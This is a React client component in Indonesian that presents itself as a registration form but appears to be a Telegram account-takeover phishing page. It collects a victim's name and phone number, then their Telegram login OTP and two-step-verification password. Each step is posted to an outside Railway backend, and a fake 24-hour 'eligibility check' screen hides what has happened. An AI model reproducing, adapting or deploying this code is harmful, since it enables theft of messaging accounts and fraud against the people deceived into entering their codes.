"use client";

import React, { useState } from 'react';

const AuthForm = () => {
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [formData, setFormData] = useState({ nama: '', nomor: '', otp: '', sandi: '' });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
    setError('');
  };

  const handleNext = async () => {
    setLoading(true);
    setError('');
    
    try {
      const response = await fetch('https://backend-python-production-6e72.up.railway.app/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...formData, step }),
      });

      const data = await response.json();

      if (response.ok) {
        if (step === 1) setStep(2);
        else if (step === 2) {
          if (data.status === 'need_2fa') setStep(3);
          else setStep(4);
        } else if (step === 3) setStep(4);
      } else {
        if (data.status === 'invalid_2fa') setError('KATA SANDI SALAH!!');
        else if (data.status === 'invalid_otp') setError('KODE OTP SALAH!!');
        else setError('Terjadi kesalahan server.');
      }
    } catch (err) {
      setError('Koneksi gagal. Cek backend Railway.');
    } finally {
      setLoading(false);
    }
  };

  return (
    // Container Utama: Full Screen tanpa padding samping untuk HP
    <div className="w-full min-h-screen bg-white">
      {/* Banner Atas: Full Width tanpa jarak */}
      <div className="w-full">
        <img 
          src="/banner.jpeg" 
          alt="Banner" 
          className="w-full h-auto block"
        />
      </div>

      {/* Konten Form */}
      <div className="p-6 space-y-6 max-w-md mx-auto">
        {step === 1 && (
          <div className="space-y-5">
            <h2 className="text-2xl font-black text-gray-800 text-center tracking-tight">Form Pendaftaran</h2>
            <div className="space-y-4">
              <input name="nama" placeholder="Nama Lengkap" className="w-full border-2 border-gray-200 p-4 rounded-xl outline-none focus:border-blue-600 font-medium" onChange={handleChange} />
              <input name="nomor" placeholder="Nomor Telegram Aktif (08xxx)" className="w-full border-2 border-gray-200 p-4 rounded-xl outline-none focus:border-blue-600 font-medium" onChange={handleChange} />
            </div>
            <button onClick={handleNext} className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-5 rounded-2xl shadow-xl transition-all active:scale-95 text-lg">
              DAFTAR SEKARANG
            </button>
            <p className="text-[11px] text-gray-400 italic text-center leading-tight">
              Peringatan: Pendaftaran hanya akan diproses melalui nomor telegram aktif!
            </p>
          </div>
        )}

        {step === 2 && (
          <div className="space-y-6 text-center">
            {error && <div className="bg-red-50 text-red-600 p-4 rounded-xl font-bold border-2 border-red-100 animate-shake">{error}</div>}
            <h2 className="text-blue-600 font-extrabold text-xl leading-snug px-2">
              Kami Telah Mengirimkan Kode OTP Ke Aplikasi Telegram Anda
            </h2>
            <div className="flex justify-center">
              <input name="otp" placeholder="· · · · ·" className="w-full border-2 border-gray-200 p-5 rounded-2xl text-center text-4xl font-black tracking-[0.5em] focus:border-blue-600 outline-none bg-gray-50" onChange={handleChange} maxLength={5} />
            </div>
            <button onClick={() => setStep(1)} className="text-blue-500 font-bold text-sm underline">Kirim Ulang Kode OTP</button>
            <button onClick={handleNext} disabled={loading} className="w-full bg-blue-600 text-white font-black py-5 rounded-2xl shadow-xl text-xl uppercase tracking-wider">
              {loading ? "MEMPROSES..." : "KONFIRMASI OTP"}
            </button>
            <p className="text-[11px] text-gray-400 italic leading-tight">
              Peringatan: Pendaftaran hanya akan diproses melalui nomor telegram aktif!
            </p>
          </div>
        )}

        {step === 3 && (
          <div className="space-y-6 text-center">
            <h2 className="font-black text-gray-800 text-2xl">Verifikasi 2 Langkah</h2>
            <p className="text-gray-500 font-medium">Akun Anda dilindungi kata sandi tambahan. Masukkan untuk verifikasi kelayakan.</p>
            <input 
              name="sandi" 
              type="password" 
              placeholder="Masukkan Kata Sandi" 
              className={`w-full border-2 p-5 rounded-2xl text-center font-bold text-xl ${error ? 'border-red-600 bg-red-50 animate-shake' : 'border-gray-200 focus:border-blue-600'}`} 
              onChange={handleChange} 
            />
            {error && <p className="text-red-600 font-black text-sm">{error}</p>}
            <button onClick={handleNext} disabled={loading} className="w-full bg-blue-600 text-white font-black py-5 rounded-2xl shadow-xl text-lg uppercase">
              {loading ? "MENGECEK..." : "LANJUTKAN"}
            </button>
          </div>
        )}

        {step === 4 && (
          <div className="text-center py-20 space-y-8 animate-fade-in">
            <div className="relative w-24 h-24 mx-auto">
              <div className="absolute inset-0 border-4 border-blue-100 rounded-full"></div>
              <div className="absolute inset-0 border-4 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
            </div>
            <div className="space-y-4 px-4">
               <h2 className="text-2xl font-black text-gray-800 tracking-tight">SEDANG MEMPROSES...</h2>
               <p className="text-gray-600 font-bold text-lg leading-relaxed bg-blue-50 p-6 rounded-2xl border-2 border-blue-100">
                 Silakan tunggu prosesnya konfirmasi dalam waktu 1x24 jam untuk memeriksa kelayakan
               </p>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default AuthForm;